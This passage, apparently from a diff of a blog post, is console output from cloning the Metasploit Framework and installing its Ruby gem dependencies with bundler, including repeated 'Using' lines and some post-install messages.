(7489/13372), 48.25 MiB | 1.80 MiB/Receiving objects:  57% (7623/13372), 48.25 MiB | 1.80 MiB/Receiving objects:  58% (7756/13372), 48.25 MiB | 1.80 MiB/Receiving objects:  59% (7890/13372), 48.25 MiB | 1.80 MiB/Receiving objects:  60% (8024/13372), 48.25 MiB | 1.80 MiB/Receiving objects:  60% (8072/13372), 48.25 MiB | 1.80 MiB/Receiving objects:  61% (8157/13372), 48.25 MiB | 1.80 MiB/Receiving objects:  62% (8291/13372), 48.25 MiB | 1.80 MiB/Receiving objects:  63% (8425/13372), 48.25 MiB | 1.80 MiB/Receiving objects:  64% (8559/13372), 49.77 MiB | 1.90 MiB/Receiving objects:  65% (8692/13372), 49.77 MiB | 1.90 MiB/Receiving objects:  66% (8826/13372), 49.77 MiB | 1.90 MiB/Receiving objects:  67% (8960/13372), 49.77 MiB | 1.90 MiB/Receiving objects:  68% (9093/13372), 50.52 MiB | 1.93 MiB/Receiving objects:  69% (9227/13372), 50.52 MiB | 1.93 MiB/Receiving objects:  69% (9335/13372), 50.52 MiB | 1.93 MiB/Receiving objects:  70% (9361/13372), 50.52 MiB | 1.93 MiB/Receiving objects:  71% (9495/13372), 50.52 MiB | 1.93 MiB/Receiving objects:  72% (9628/13372), 51.39 MiB | 1.87 MiB/Receiving objects:  73% (9762/13372), 51.39 MiB | 1.87 MiB/Receiving objects:  74% (9896/13372), 52.04 MiB | 1.75 MiB/Receiving objects:  75% (10029/13372), 52.04 MiB | 1.75 MiBReceiving objects:  75% (10159/13372), 52.04 MiB | 1.75 MiBReceiving objects:  76% (10163/13372), 52.04 MiB | 1.75 MiBReceiving objects:  77% (10297/13372), 52.04 MiB | 1.75 MiBReceiving objects:  78% (10431/13372), 52.04 MiB | 1.75 MiBReceiving objects:  79% (10564/13372), 53.30 MiB | 1.77 MiBReceiving objects:  80% (10698/13372), 53.30 MiB | 1.77 MiBReceiving objects:  81% (10832/13372), 53.30 MiB | 1.77 MiBReceiving objects:  82% (10966/13372), 53.30 MiB | 1.77 MiBReceiving objects:  83% (11099/13372), 54.15 MiB | 1.87 MiBReceiving objects:  84% (11233/13372), 54.15 MiB | 1.87 MiBReceiving objects:  84% (11309/13372), 54.15 MiB | 1.87 MiBReceiving objects:  85% (11367/13372), 54.15 MiB | 1.87 MiBReceiving objects:  86% (11500/13372), 54.15 MiB | 1.87 MiBReceiving objects:  87% (11634/13372), 54.15 MiB | 1.87 MiBReceiving objects:  88% (11768/13372), 54.15 MiB | 1.87 MiBReceiving objects:  89% (11902/13372), 54.15 MiB | 1.87 MiBReceiving objects:  90% (12035/13372), 54.15 MiB | 1.87 MiBReceiving objects:  91% (12169/13372), 55.21 MiB | 2.00 MiBReceiving objects:  92% (12303/13372), 55.21 MiB | 2.00 MiBReceiving objects:  93% (12436/13372), 55.21 MiB | 2.00 MiBReceiving objects:  94% (12570/13372), 55.21 MiB | 2.00 MiBReceiving objects:  95% (12704/13372), 55.21 MiB | 2.00 MiBReceiving objects:  96% (12838/13372), 55.21 MiB | 2.00 MiBReceiving objects:  97% (12971/13372), 55.21 MiB | 2.00 MiBReceiving objects:  98% (13105/13372), 56.12 MiB | 1.92 MiBReceiving objects:  99% (13239/13372), 56.12 MiB | 1.92 MiBremote: Total 13372 (delta 1669), reused 6156 (delta 1089), pack-reused 0
+Receiving objects: 100% (13372/13372), 56.12 MiB | 1.92 MiBReceiving objects: 100% (13372/13372), 56.34 MiB | 1.37 MiB/s, done.
+Resolving deltas: 100% (1669/1669), done.
+Updating files: 100% (11480/11480), done.&lt;/p&gt;
+&lt;p&gt;=================== *** Installation&amp;hellip; ===================
+Fetching bundler-2.2.29.gem
+Successfully installed bundler-2.2.29
+Parsing documentation for bundler-2.2.29
+Installing ri documentation for bundler-2.2.29
+Done installing documentation for bundler after 19 seconds
+1 gem installed
+Fetching nokogiri-1.8.0.gem
+Fetching mini_portile2-2.2.0.gem
+Successfully installed mini_portile2-2.2.0
+Building native extensions with: &amp;lsquo;&amp;ndash;use-system-libraries&amp;rsquo;
+This could take a while&amp;hellip;
+Successfully installed nokogiri-1.8.0
+Parsing documentation for mini_portile2-2.2.0
+Installing ri documentation for mini_portile2-2.2.0
+Parsing documentation for nokogiri-1.8.0
+Installing ri documentation for nokogiri-1.8.0
+Done installing documentation for mini_portile2, nokogiri after 56 seconds
+2 gems installed
+Fetching concurrent-ruby-1.1.9.gem
+Fetching rack-test-1.1.0.gem
+Fetching i18n-1.8.10.gem
+Fetching zeitwerk-2.4.2.gem
+Fetching rack-2.2.3.gem
+Fetching crass-1.0.6.gem
+Fetching tzinfo-2.0.4.gem
+Fetching activesupport-6.1.4.1.gem
+Fetching loofah-2.12.0.gem
+Fetching rails-html-sanitizer-1.4.2.gem
+Fetching rails-dom-testing-2.0.3.gem
+Fetching builder-3.2.4.gem
+Fetching erubi-1.10.0.gem
+Fetching actionview-6.1.4.1.gem
+Fetching actionpack-6.1.4.1.gem
+Successfully installed concurrent-ruby-1.1.9
+Successfully installed i18n-1.8.10
+Successfully installed tzinfo-2.0.4
+Successfully installed zeitwerk-2.4.2
+Successfully installed activesupport-6.1.4.1
+Successfully installed rack-2.2.3
+Successfully installed rack-test-1.1.0
+Successfully installed crass-1.0.6
+Successfully installed loofah-2.12.0
+Successfully installed rails-html-sanitizer-1.4.2
+Successfully installed rails-dom-testing-2.0.3
+Successfully installed builder-3.2.4
+Successfully installed erubi-1.10.0
+Successfully installed actionview-6.1.4.1
+Successfully installed actionpack-6.1.4.1
+Parsing documentation for concurrent-ruby-1.1.9
+Installing ri documentation for concurrent-ruby-1.1.9
+Parsing documentation for i18n-1.8.10
+Installing ri documentation for i18n-1.8.10
+Parsing documentation for tzinfo-2.0.4
+Installing ri documentation for tzinfo-2.0.4
+Parsing documentation for zeitwerk-2.4.2
+Installing ri documentation for zeitwerk-2.4.2
+Parsing documentation for activesupport-6.1.4.1
+Installing ri documentation for activesupport-6.1.4.1
+Parsing documentation for rack-2.2.3
+Installing ri documentation for rack-2.2.3
+Parsing documentation for rack-test-1.1.0
+Installing ri documentation for rack-test-1.1.0
+Parsing documentation for crass-1.0.6
+Installing ri documentation for crass-1.0.6
+Parsing documentation for loofah-2.12.0
+Installing ri documentation for loofah-2.12.0
+Parsing documentation for rails-html-sanitizer-1.4.2
+Installing ri documentation for rails-html-sanitizer-1.4.2
+Parsing documentation for rails-dom-testing-2.0.3
+Installing ri documentation for rails-dom-testing-2.0.3
+Parsing documentation for builder-3.2.4
+Installing ri documentation for builder-3.2.4
+Parsing documentation for erubi-1.10.0
+Installing ri documentation for erubi-1.10.0
+Parsing documentation for actionview-6.1.4.1
+Installing ri documentation for actionview-6.1.4.1
+Parsing documentation for actionpack-6.1.4.1
+Installing ri documentation for actionpack-6.1.4.1
+Done installing documentation for concurrent-ruby, i18n, tzinfo, zeitwerk, activesupport, rack, rack-test, crass, loofah, rails-html-sanitizer, rails-dom-testing, builder, erubi, actionview, actionpack after 139 seconds
+15 gems installed
+Fetching gem metadata from &lt;a class=&#34;link&#34; href=&#34;https://rubygems.org/........&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://rubygems.org/........&lt;/a&gt;.
+Fetching gem metadata from &lt;a class=&#34;link&#34; href=&#34;https://rubygems.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://rubygems.org/&lt;/a&gt;.
+Resolving dependencies&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;..
+Fetching rake 13.0.6
+Installing rake 13.0.6
+Fetching Ascii85 1.1.0
+Installing Ascii85 1.1.0
+Fetching concurrent-ruby 1.0.5
+Installing concurrent-ruby 1.0.5
+Using i18n 1.8.10
+Fetching minitest 5.14.4
+Installing minitest 5.14.4
+Using tzinfo 2.0.4
+Using zeitwerk 2.4.2
+Using activesupport 6.1.4.1
+Using builder 3.2.4
+Using erubi 1.10.0
+Fetching mini_portile2 2.6.1
+Installing mini_portile2 2.6.1
+Fetching racc 1.5.2
+Installing racc 1.5.2 with native extensions
+Using nokogiri 1.8.0
+Using rails-dom-testing 2.0.3
+Using crass 1.0.6
+Using loofah 2.12.0
+Using rails-html-sanitizer 1.4.2
+Using actionview 6.1.4.1
+Using rack 2.2.3
+Using rack-test 1.1.0
+Using actionpack 6.1.4.1
+Fetching activemodel 6.1.4.1
+Installing activemodel 6.1.4.1
+Fetching activerecord 6.1.4.1
+Installing activerecord 6.1.4.1
+Fetching public_suffix 4.0.6
+Installing public_suffix 4.0.6
+Fetching addressable 2.8.0
+Installing addressable 2.8.0
+Fetching afm 0.2.2
+Installing afm 0.2.2
+Fetching arel-helpers 2.12.1
+Installing arel-helpers 2.12.1
+Fetching ast 2.4.2
+Installing ast 2.4.2
+Fetching aws-eventstream 1.2.0
+Installing aws-eventstream 1.2.0
+Fetching aws-partitions 1.515.0
+Installing aws-partitions 1.515.0
+Fetching aws-sigv4 1.4.0
+Installing aws-sigv4 1.4.0
+Fetching jmespath 1.4.0
+Installing jmespath 1.4.0
+Fetching aws-sdk-core 3.121.1
+Installing aws-sdk-core 3.121.1
+Fetching aws-sdk-ec2 1.270.0
+Installing aws-sdk-ec2 1.270.0
+Fetching aws-sdk-iam 1.61.0
+Installing aws-sdk-iam 1.61.0
+Fetching aws-sdk-kms 1.49.0
+Installing aws-sdk-kms 1.49.0
+Fetching aws-sdk-s3 1.103.0
+Installing aws-sdk-s3 1.103.0
+Fetching bcrypt 3.1.16
+Installing bcrypt 3.1.16 with native extensions
+Fetching bcrypt_pbkdf 1.1.0
+Installing bcrypt_pbkdf 1.1.0 with native extensions
+Fetching bindata 2.4.10
+Installing bindata 2.4.10
+Fetching bson 4.12.1
+Installing bson 4.12.1 with native extensions
+Using bundler 2.1.4
+Fetching byebug 11.1.3
+Installing byebug 11.1.3 with native extensions
+Fetching coderay 1.1.3
+Installing coderay 1.1.3
+Fetching cookiejar 0.3.3
+Installing cookiejar 0.3.3
+Fetching daemons 1.4.1
+Installing daemons 1.4.1
+Fetching diff-lcs 1.4.4
+Installing diff-lcs 1.4.4
+Fetching unf_ext 0.0.8
+Installing unf_ext 0.0.8 with native extensions
+Fetching unf 0.1.4
+Installing unf 0.1.4
+Fetching simpleidn 0.2.1
+Installing simpleidn 0.2.1
+Fetching dnsruby 1.61.7
+Installing dnsruby 1.61.7
+Fetching docile 1.4.0
+Installing docile 1.4.0
+Fetching domain_name 0.5.20190701
+Installing domain_name 0.5.20190701
+Fetching ed25519 1.2.4
+Installing ed25519 1.2.4 with native extensions
+Fetching eventmachine 1.2.7
+Installing eventmachine 1.2.7 with native extensions
+Fetching em-socksify 0.3.2
+Installing em-socksify 0.3.2
+Fetching http_parser.rb 0.8.0
+Installing http_parser.rb 0.8.0 with native extensions
+Fetching em-http-request 1.1.7
+Installing em-http-request 1.1.7
+Fetching factory_bot 6.2.0
+Installing factory_bot 6.2.0
+Fetching method_source 1.0.0
+Installing method_source 1.0.0
+Fetching thor 1.1.0
+Installing thor 1.1.0
+Fetching railties 6.1.4.1
+Installing railties 6.1.4.1
+Fetching factory_bot_rails 6.2.0
+Installing factory_bot_rails 6.2.0
+Fetching faker 2.19.0
+Installing faker 2.19.0
+Fetching faraday-em_http 1.0.0
+Installing faraday-em_http 1.0.0
+Fetching faraday-em_synchrony 1.0.0
+Installing faraday-em_synchrony 1.0.0
+Fetching faraday-excon 1.1.0
+Installing faraday-excon 1.1.0
+Fetching faraday-httpclient 1.0.1
+Installing faraday-httpclient 1.0.1
+Fetching faraday-net_http 1.0.1
+Installing faraday-net_http 1.0.1
+Fetching faraday-net_http_persistent 1.2.0
+Installing faraday-net_http_persistent 1.2.0
+Fetching faraday-patron 1.0.0
+Installing faraday-patron 1.0.0
+Fetching faraday-rack 1.0.0
+Installing faraday-rack 1.0.0
+Fetching multipart-post 2.1.1
+Installing multipart-post 2.1.1
+Fetching ruby2_keywords 0.0.5
+Installing ruby2_keywords 0.0.5
+Fetching faraday 1.8.0
+Installing faraday 1.8.0
+Fetching websocket-extensions 0.1.5
+Installing websocket-extensions 0.1.5
+Fetching websocket-driver 0.7.5
+Installing websocket-driver 0.7.5 with native extensions
+Fetching faye-websocket 0.11.1
+Installing faye-websocket 0.11.1
+Fetching ffi 1.15.4
+Installing ffi 1.15.4 with native extensions
+Fetching filesize 0.2.0
+Installing filesize 0.2.0
+Fetching fivemat 1.3.7
+Installing fivemat 1.3.7
+Fetching gssapi 1.3.1
+Installing gssapi 1.3.1
+Fetching gyoku 1.3.1
+Installing gyoku 1.3.1
+Fetching hashery 2.1.2
+Installing hashery 2.1.2
+Fetching hrr_rb_ssh 0.4.2
+Installing hrr_rb_ssh 0.4.2
+Fetching hrr_rb_ssh-ed25519 0.4.2
+Installing hrr_rb_ssh-ed25519 0.4.2
+Fetching http-cookie 1.0.4
+Installing http-cookie 1.0.4
+Fetching httpclient 2.8.3
+Installing httpclient 2.8.3
+Fetching io-console 0.5.9
+Installing io-console 0.5.9 with native extensions
+Fetching reline 0.2.5
+Installing reline 0.2.5
+Fetching irb 1.3.6
+Installing irb 1.3.6
+Fetching rkelly-remix 0.0.7
+Installing rkelly-remix 0.0.7
+Fetching jsobfu 0.4.2
+Installing jsobfu 0.4.2
+Fetching json 2.6.0
+Installing json 2.6.0 with native extensions
+Fetching little-plugger 1.1.4
+Installing little-plugger 1.1.4
+Fetching multi_json 1.15.0
+Installing multi_json 1.15.0
+Fetching logging 2.3.0
+Installing logging 2.3.0
+Fetching memory_profiler 1.0.0
+Installing memory_profiler 1.0.0
+Fetching metasm 1.0.5
+Installing metasm 1.0.5
+Fetching metasploit-concern 4.0.3
+Installing metasploit-concern 4.0.3
+Fetching metasploit-model 4.0.3
+Installing metasploit-model 4.0.3
+Fetching pg 1.2.3
+Installing pg 1.2.3 with native extensions
+Fetching recog 2.3.21
+Installing recog 2.3.21
+Fetching webrick 1.7.0
+Installing webrick 1.7.0
+Fetching metasploit_data_models 5.0.4
+Installing metasploit_data_models 5.0.4
+Fetching net-ssh 6.1.0
+Installing net-ssh 6.1.0
+Fetching rex-core 0.1.18
+Installing rex-core 0.1.18
+Fetching rex-socket 0.1.33
+Installing rex-socket 0.1.33
+Fetching rubyntlm 0.6.3
+Installing rubyntlm 0.6.3
+Fetching rubyzip 2.3.2
+Installing rubyzip 2.3.2
+Fetching metasploit-credential 5.0.5
+Installing metasploit-credential 5.0.5
+Fetching metasploit-payloads 2.0.58
+Installing metasploit-payloads 2.0.58
+Fetching metasploit_payloads-mettle 1.0.13
+Installing metasploit_payloads-mettle 1.0.13
+Fetching mqtt 0.5.0
+Installing mqtt 0.5.0
+Fetching msgpack 1.4.2
+Installing msgpack 1.4.2 with native extensions
+Fetching nessus_rest 0.1.6
+Installing nessus_rest 0.1.6
+Fetching net-ldap 0.17.0
+Installing net-ldap 0.17.0
+Fetching network_interface 0.0.2
+Installing network_interface 0.0.2 with native extensions
+Fetching nexpose 7.3.0
+Installing nexpose 7.3.0
+Fetching sawyer 0.8.2
+Installing sawyer 0.8.2
+Fetching octokit 4.21.0
+Installing octokit 4.21.0
+Fetching openssl-ccm 1.2.2
+Installing openssl-ccm 1.2.2
+Fetching openvas-omp 0.0.4
+Installing openvas-omp 0.0.4
+Fetching pcaprub 0.12.4
+Installing pcaprub 0.12.4 with native extensions
+Fetching packetfu 1.1.13
+Installing packetfu 1.1.13
+Fetching patch_finder 1.0.2
+Installing patch_finder 1.0.2
+Fetching ruby-rc4 0.1.5
+Installing ruby-rc4 0.1.5
+Fetching ttfunk 1.7.0
+Installing ttfunk 1.7.0
+Fetching pdf-reader 2.5.0
+Installing pdf-reader 2.5.0
+Fetching nio4r 2.5.8
+Installing nio4r 2.5.8 with native extensions
+Fetching puma 5.5.2
+Installing puma 5.5.2 with native extensions
+Fetching rb-readline 0.5.5
+Installing rb-readline 0.5.5
+Fetching redcarpet 3.5.1
+Installing redcarpet 3.5.1 with native extensions
+Fetching rex-text 0.2.37
+Installing rex-text 0.2.37
+Fetching rex-arch 0.1.14
+Installing rex-arch 0.1.14
+Fetching rex-struct2 0.1.3
+Installing rex-struct2 0.1.3
+Fetching rex-bin_tools 0.1.8
+Installing rex-bin_tools 0.1.8
+Fetching rex-encoder 0.1.6
+Installing rex-encoder 0.1.6
+Fetching rexml 3.2.5
+Installing rexml 3.2.5
+Fetching rex-exploitation 0.1.28
+Installing rex-exploitation 0.1.28
+Fetching rex-java 0.1.6
+Installing rex-java 0.1.6
+Fetching rex-mime 0.1.6
+Installing rex-mime 0.1.6
+Fetching rex-nop 0.1.2
+Installing rex-nop 0.1.2
+Fetching rex-ole 0.1.7
+Installing rex-ole 0.1.7
+Fetching rex-random_identifier 0.1.8
+Installing rex-random_identifier 0.1.8
+Fetching rex-powershell 0.1.93
+Installing rex-powershell 0.1.93
+Fetching rex-registry 0.1.4
+Installing rex-registry 0.1.4
+Fetching rex-rop_builder 0.1.4
+Installing rex-rop_builder 0.1.4
+Fetching rex-sslscan 0.1.6
+Installing rex-sslscan 0.1.6
+Fetching rex-zip 0.1.4
+Installing rex-zip 0.1.4
+Fetching ruby-macho 2.5.1
+Installing ruby-macho 2.5.1
+Fetching openssl-cmac 2.0.1
+Installing openssl-cmac 2.0.1
+Fetching windows_error 0.1.2
+Installing windows_error 0.1.2
+Fetching ruby_smb 2.0.11
+Installing ruby_smb 2.0.11
+Fetching mustermann 1.1.1
+Installing mustermann 1.1.1
+Fetching rack-protection 2.1.0
+Installing rack-protection 2.1.0
+Fetching tilt 2.0.10
+Installing tilt 2.0.10
+Fetching sinatra 2.1.0
+Installing sinatra 2.1.0
+Fetching sqlite3 1.4.2
+Installing sqlite3 1.4.2 with native extensions
+Fetching sshkey 2.0.0
+Installing sshkey 2.0.0
+Fetching swagger-blocks 3.0.0
+Installing swagger-blocks 3.0.0
+Fetching thin 1.8.1
+Installing thin 1.8.1 with native extensions
+Fetching tzinfo-data 1.2021.3
+Installing tzinfo-data 1.2021.3
+Fetching unix-crypt 1.3.0
+Installing unix-crypt 1.3.0
+Fetching warden 1.2.9
+Installing warden 1.2.9
+Fetching win32api 0.1.0
+Installing win32api 0.1.0
+Fetching nori 2.6.0
+Installing nori 2.6.0
+Fetching winrm 2.3.6
+Installing winrm 2.3.6
+Fetching xdr 3.0.2
+Installing xdr 3.0.2
+Fetching xmlrpc 0.3.2
+Installing xmlrpc 0.3.2
+Using metasploit-framework 6.1.11 from source at &lt;code&gt;.&lt;/code&gt;
+Fetching parallel 1.21.0
+Installing parallel 1.21.0
+Fetching parser 3.0.2.0
+Installing parser 3.0.2.0
+Fetching pry 0.13.1
+Installing pry 0.13.1
+Fetching pry-byebug 3.9.0
+Installing pry-byebug 3.9.0
+Fetching rainbow 3.0.0
+Installing rainbow 3.0.0
+Fetching regexp_parser 2.1.1
+Installing regexp_parser 2.1.1
+Fetching rspec-support 3.10.2
+Installing rspec-support 3.10.2
+Fetching rspec-core 3.10.1
+Installing rspec-core 3.10.1
+Fetching rspec-expectations 3.10.1
+Installing rspec-expectations 3.10.1
+Fetching rspec-mocks 3.10.2
+Installing rspec-mocks 3.10.2
+Fetching rspec 3.10.0
+Installing rspec 3.10.0
+Fetching rspec-rails 5.0.2
+Installing rspec-rails 5.0.2
+Fetching rspec-rerun 1.1.0
+Installing rspec-rerun 1.1.0
+Fetching rubocop-ast 1.12.0
+Installing rubocop-ast 1.12.0
+Fetching ruby-progressbar 1.11.0
+Installing ruby-progressbar 1.11.0
+Fetching unicode-display_width 2.1.0
+Installing unicode-display_width 2.1.0
+Fetching rubocop 1.22.1
+Installing rubocop 1.22.1
+Fetching ruby-prof 1.4.2
+Installing ruby-prof 1.4.2 with native extensions
+Fetching simplecov-html 0.12.3
+Installing simplecov-html 0.12.3
+Fetching simplecov 0.18.2
+Installing simplecov 0.18.2
+Fetching timecop 0.9.4
+Installing timecop 0.9.4
+Fetching yard 0.9.26
+Installing yard 0.9.26
+Bundler attempted to update activesupport but its version stayed the same
+Bundle updated!
+Post-install message from dnsruby:
+Installing dnsruby&amp;hellip;
+For issues and source code: &lt;a class=&#34;link&#34; href=&#34;https://github.com/alexdalitz/dnsruby&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/alexdalitz/dnsruby&lt;/a&gt;
+For general discussion (please tell us how you use dnsruby): &lt;a class=&#34;link&#34; href=&#34;https://groups.google.com/forum/#!forum/dnsruby&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://groups.google.com/forum/#!forum/dnsruby&lt;/a&gt;
+Post-install message from rubyzip:
+RubyZip 3.0 is coming!&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;The public API of some Rubyzip classes has been modernized to use named
+parameters for optional arguments. Please check your usage of the
+following classes:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Zip::File&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Zip::Entry&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Zip::InputStream&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Zip::OutputStream&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Please ensure that your Gemfiles and .gemspecs are suitably restrictive
+to avoid an unexpected breakage when 3.0 is released (e.g. ~&amp;gt; 2.3.0).
+See &lt;a class=&#34;link&#34; href=&#34;https://github.com/rubyzip/rubyzip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/rubyzip/rubyzip&lt;/a&gt; for details. The Changelog also
+lists other enhancements and bugfixes that have been implemented since
+version 2.3.0.
+Post-install message from openssl-ccm:
+Thanks for installing!
+Post-install message from openssl-cmac:
+Thanks for installing!
+Using rake 13.0.6
+Using Ascii85 1.1.0
+Using concurrent-ruby 1.0.5
+Using i18n 1.8.10
+Using minitest 5.14.4
+Using tzinfo 2.0.4
+Using zeitwerk 2.4.2
+Using activesupport 6.1.4.1
+Using builder 3.2.4
+Using erubi 1.10.0
+Using mini_portile2 2.6.1
+Using racc 1.5.2
+Using nokogiri 1.8.0
+Using rails-dom-testing 2.0.3
+Using crass 1.0.6
+Using loofah 2.12.0
+Using rails-html-sanitizer 1.4.2
+Using actionview 6.1.4.1
+Using rack 2.2.3
+Using rack-test 1.1.0
+Using actionpack 6.1.4.1
+Using activemodel 6.1.4.1
+Using activerecord 6.1.4.1
+Using public_suffix 4.0.6
+Using addressable 2.8.0
+Using afm 0.2.2
+Using arel-helpers 2.12.1
+Using ast 2.4.2
+Using aws-eventstream 1.2.0
+Using aws-partitions 1.515.0
+Using aws-sigv4 1.4.0
+Using jmespath 1.4.0
+Using aws-sdk-core 3.121.1
+Using aws-sdk-ec2 1.270.0
+Using aws-sdk-iam 1.61.0
+Using aws-sdk-kms 1.49.0
+Using aws-sdk-s3 1.103.0
+Using bcrypt 3.1.16
+Using bcrypt_pbkdf 1.1.0
+Using bindata 2.4.10
+Using bson 4.12.1
+Using bundler 2.2.29
+Using byebug 11.1.3
+Using coderay 1.1.3
+Using cookiejar 0.3.3
+Using daemons 1.4.1
+Using diff-lcs 1.4.4
+Using unf_ext 0.0.8
+Using unf 0.1.4
+Using simpleidn 0.2.1
+Using dnsruby 1.61.7
+Using docile 1.4.0
+Using domain_name 0.5.20190701
+Using ed25519 1.2.4
+Using eventmachine 1.2.7
+Using em-socksify 0.3.2
+Using http_parser.rb 0.8.0
+Using em-http-request 1.1.7
+Using factory_bot 6.2.0
+Using method_source 1.0.0
+Using thor 1.1.0
+Using railties 6.1.4.1
+Using factory_bot_rails 6.2.0
+Using faker 2.19.0
+Using faraday-em_http 1.0.0
+Using faraday-em_synchrony 1.0.0
+Using faraday-excon 1.1.0
+Using faraday-httpclient 1.0.1
+Using faraday-net_http 1.0.1
+Using faraday-net_http_persistent 1.2.0
+Using faraday-patron 1.0.0
+Using faraday-rack 1.0.0
+Using multipart-post 2.1.1
+Using ruby2_keywords 0.0.5
+Using faraday 1.8.0
+Using websocket-extensions 0.1.5
+Using websocket-driver 0.7.5
+Using faye-websocket 0.11.1
+Using ffi 1.15.4
+Using filesize 0.2.0
+Using fivemat 1.3.7
+Using gssapi 1.3.1
+Using gyoku 1.3.1
+Using hashery 2.1.2
+Using hrr_rb_ssh 0.4.2
+Using hrr_rb_ssh-ed25519 0.4.2
+Using http-cookie 1.0.4
+Using httpclient 2.8.3
+Using io-console 0.5.9
+Using reline 0.2.5
+Using irb 1.3.6
+Using rkelly-remix 0.0.7
+Using jsobfu 0.4.2
+Using json 2.6.0
+Using little-plugger 1.1.4
+Using multi_json 1.15.0
+Using logging 2.3.0
+Using memory_profiler 1.0.0
+Using metasm 1.0.5
+Using metasploit-concern 4.0.3
+Using metasploit-model 4.0.3
+Using pg 1.2.3
+Using recog 2.3.21
+Using webrick 1.7.0
+Using metasploit_data_models 5.0.4
+Using net-ssh 6.1.0
+Using rex-core 0.1.18
+Using rex-socket 0.1.33
+Using rubyntlm 0.6.3
+Using rubyzip 2.3.2
+Using metasploit-credential 5.0.5
+Using metasploit-payloads 2.0.58
+Using metasploit_payloads-mettle 1.0.13
+Using mqtt 0.5.0
+Using msgpack 1.4.2
+Using nessus_rest 0.1.6
+Using net-ldap 0.17.0
+Using network_interface 0.0.2
+Using nexpose 7.3.0
+Using sawyer 0.8.2
+Using octokit 4.21.0
+Using openssl-ccm 1.2.2
+Using openvas-omp 0.0.4
+Using pcaprub 0.12.4
+Using packetfu 1.1.13
+Using patch_finder 1.0.2
+Using ruby-rc4 0.1.5
+Using ttfunk 1.7.0
+Using pdf-reader 2.5.0
+Using nio4r 2.5.8
+Using puma 5.5.2
+Using rb-readline 0.5.5
+Using redcarpet 3.5.1
+Using rex-text 0.2.37
+Using rex-arch 0.1.14
+Using rex-struct2 0.1.3
+Using rex-bin_tools 0.1.8
+Using rex-encoder 0.1.6
+Using rexml 3.2.5
+Using rex-exploitation 0.1.28
+Using rex-java 0.1.6
+Using rex-mime 0.1.6
+Using rex-nop 0.1.2
+Using rex-ole 0.1.7
+Using rex-random_identifier 0.1.8
+Using rex-powershell 0.1.93
+Using rex-registry 0.1.4
+Using rex-rop_builder 0.1.4
+Using rex-sslscan 0.1.6
+Using rex-zip 0.1.4
+Using ruby-macho 2.5.1
+Using openssl-cmac 2.0.1
+Using windows_error 0.1.2
+Using ruby_smb 2.0.11
+Using mustermann 1.1.1
+Using rack-protection 2.1.0
+Using tilt 2.0.10
+Using sinatra 2.1.0
+Using sqlite3 1.4.2
+Using sshkey 2.0.0
+Using swagger-blocks 3.0.0
+Using thin 1.8.1
+Using tzinfo-data 1.2021.3
+Using unix-crypt 1.3.0
+Using warden 1.2.9
+Using win32api 0.1.0
+Using nori 2.6.0
+Using winrm 2.3.6
+Using xdr 3.0.2
+Using xmlrpc 0.3.2
+Using metasploit-framework 6.1.11 from source at &lt;code&gt;.&lt;/code&gt;
+Using parallel 1.21.0
+Using parser 3.0.2.0
+Using pry 0.13.1
+Using pry-byebug 3.9.0
+Using rainbow 3.0.0
+Using regexp_parser 2.1.1
+Using rspec-support 3.10.2
+Using rspec-core 3.10.1
+Using rspec-expectations 3.10.1
+Using rspec-mocks 3.10.2
+Using rspec 3.10.0
+Using rspec-rails 5.0.2
+Using rspec-rerun 1.1.0
+Using rubocop-ast 1.12.0
+Using ruby-progressbar 1.11.0
+Using unicode-display_width 2.1.0
+Using rubocop 1.22.1
+Using ruby-prof 1.4.2
+Using simplecov-html 0.12.3
+Using simplecov 0.18.2
+Using timecop 0.9.4
+Using yard 0.9.26
+Bundle updated!
+Using rake 13.0.6
+Using Ascii85 1.1.0
+Using concurrent-ruby 1.0.5
+Using i18n 1.8.10
+Using minitest 5.14.4
+Using tzinfo 2.0.4
+Using zeitwerk 2.4.2
+Using activesupport 6.1.4.1
+Using builder 3.2.4
+Using erubi 1.10.0
+Using mini_portile2 2.6.1
+Using racc 1.5.2
+Using nokogiri 1.8.0
+Using rails-dom-testing 2.0.3
+Using crass 1.0.6
+Using loofah 2.12.0
+Using rails-html-sanitizer 1.4.2
+Using actionview 6.1.4.1
+Using rack 2.2.3
+Using rack-test 1.1.0
+Using actionpack 6.1.4.1
+Using activemodel 6.1.4.1
+Using activerecord 6.1.4.1
+Using public_suffix 4.0.6
+Using addressable 2.8.0
+Using afm 0.2.2
+Using arel-helpers 2.12.1
+Using ast 2.4.2
+Using aws-eventstream 1.2.0
+Using aws-partitions 1.515.0
+Using aws-sigv4 1.4.0
+Using jmespath 1.4.0
+Using aws-sdk-core 3.121.1
+Using aws-sdk-ec2 1.270.0
+Using aws-sdk-iam 1.61.0
+Using aws-sdk-kms 1.49.0
+Using aws-sdk-s3 1.103.0
+Using bcrypt 3.1.16
+Using bcrypt_pbkdf 1.1.0
+Using bindata 2.4.10
+Using bson 4.12.1
+Using bundler 2.2.29
+Using byebug 11.1.3
+Using coderay 1.1.3
+Using cookiejar 0.3.3
+Using daemons 1.4.1
+Using diff-lcs 1.4.4
+Using unf_ext 0.0.8
+Using unf 0.1.4
+Using simpleidn 0.2.1
